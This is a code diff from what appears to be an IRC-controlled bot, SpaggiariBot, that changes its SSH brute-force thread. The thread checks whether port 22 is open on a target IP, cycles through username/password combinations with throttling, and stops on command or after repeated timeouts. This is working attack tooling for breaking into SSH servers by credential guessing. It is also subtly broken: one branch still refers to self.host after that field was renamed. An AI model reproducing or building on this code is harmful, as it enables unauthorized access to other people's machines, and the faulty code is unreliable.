@@ -251,31 +251,29 @@ class range_scan(threading.Thread):
         SpaggiariBot.sendmsg(chan, '[%s] - Scan has completed.' % (color('#', blue)))
 
 class ssh_bruteforce(threading.Thread):
-    def __init__(self, host):
-        self.host     = host
+    def __init__(self, ip):
+        self.ip       = ip
         self.timeouts = 0
-        self.breaker  = False
         threading.Thread.__init__(self)
     def run(self):
-        if check_port(self.host, 22):
-            for user in combos.keys():
-                if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
+        if check_port(self.ip, 22):
+            for username,password in combos:
+                if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                     break
                 else:
-                    password = combos[user]
                     if type(password) == tuple:
                         for item in password:
-                            if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
+                            if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                                 break
                             else:
-                                result = ssh_connect(self.host, user, item)
+                                result = ssh_connect(self.ip, username, item)
                                 if   result == 1 : self.timeouts += 1
-                                elif result == 2 : self.breaker = True
+                                elif result == 2 : self.timeouts = timeout_breaker
                                 time.sleep(throttle)
                     else:
-                        result = ssh_connect(self.host, user, password)
+                        result = ssh_connect(self.host, username, password)
                         if   result == 1 : self.timeouts += 1
-                        elif result == 2 : self.breaker = True
+                        elif result == 2 : self.timeouts = timeout_breaker
                         time.sleep(throttle)
 
 def ssh_connect(hostname, username, password):
